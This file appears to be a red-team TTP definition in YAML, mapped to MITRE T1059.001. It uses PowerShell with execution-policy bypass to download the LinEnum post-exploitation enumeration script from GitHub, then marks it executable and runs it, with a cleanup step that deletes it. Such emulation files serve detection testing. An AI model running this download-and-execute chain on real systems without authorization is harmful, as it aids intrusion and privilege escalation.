---
api_version: 2.0
uuid: f0e89457-0443-4ac8-a49a-fc0e89e8ff52
name: download-post-exploitation-tool-with-powershell
description: Download a post exploitation tool from a given link and execute it with Powershell.
requirements:
  platforms:
    - os: linux
args:
  - name: escalate_privileges
    default: false
  - name: download_link
    default: https://raw.githubusercontent.com/rebootuser/LinEnum/65475312171107e9373dd8b06c9757610f0653d8/LinEnum.sh
  - name: download_path
    default: "./LinEnum.sh"
mitre:
  tactics:
    - TA0002 Execution
  techniques:
    - T1059 Command and Scripting Interpreter
  subtechniques:
    - T1059.001 Command and Scripting Interpreter PowerShell
steps:
  - name: setup
    inline: |
      if ! command -v pwsh &> /dev/null; then
          echo "Error: pwsh is not installed on the current system, cannot download LinEnum."
          exit 1
      fi
  - name: ensure-root-user-if-required
    inline: |
      if [[ {{ .Args.escalate_privileges }} -ne 0 ]]; then
        if [[ "${EUID}" -ne 0 ]]; then
            echo "error: TTP must be run as root."
            exit 1
        fi
      else
        echo "No need to run as root."
      fi
  - name: download-file
    inline: |
      pwsh -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile(\"{{ .Args.download_link }}\",\"{{ .Args.download_path }}\")"
      download_status=$?
      if [[ ${download_status} == 1 ]]; then
          echo "failed to download {{ .Args.download_link }}"
      fi
    cleanup:
      inline: |
        echo "Cleaning up"
        rm "{{ .Args.download_path }}"
  - name: make-file-executable
    inline: |
      chmod +x "{{ .Args.download_path }}"
  - name: execute-file
    inline: |
      "{{ .Args.download_path }}"
      execution_status=$?
      if [[ "${execution_status}" == 0 ||
          "${execution_status}" == 124 ]]; then
          echo "TTP Ran Successfully"
          exit 0
      else
          exit 1
      fi
